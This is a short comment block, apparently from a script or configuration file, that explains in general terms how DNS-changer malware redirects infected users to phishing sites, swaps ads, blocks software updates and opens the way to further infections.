#  Once modified, systems use foreign DNS servers,  which are
#  usually set up by cybercriminals. Users with vulnerable
#  systems or devices who try to access certain sites are
#  instead redirected to possibly malicious sites.
#
#  Modifying systems' DNS settings allows cybercriminals to
#  perform malicious activities like:
#
#    o  Steering unknowing users to bad sites:
#       These sites can be phishing pages that
#       spoof well-known sites in order to
#       trick users into handing out sensitive
#       information.
#
#    o  Replacing ads on legitimate sites:
#       Visiting certain sites can serve users
#       with infected systems a different set
#       of ads from those whose systems are
#       not infected.
#
#    o  Controlling and redirecting network traffic:
#       Users of infected systems may not be granted
#       access to download important OS and software
#       updates from vendors like Microsoft and from
#       their respective security vendors.
#
#    o  Pushing additional malware:
#       Infected systems are more prone to other
#       malware infections (e.g., FAKEAV infection).
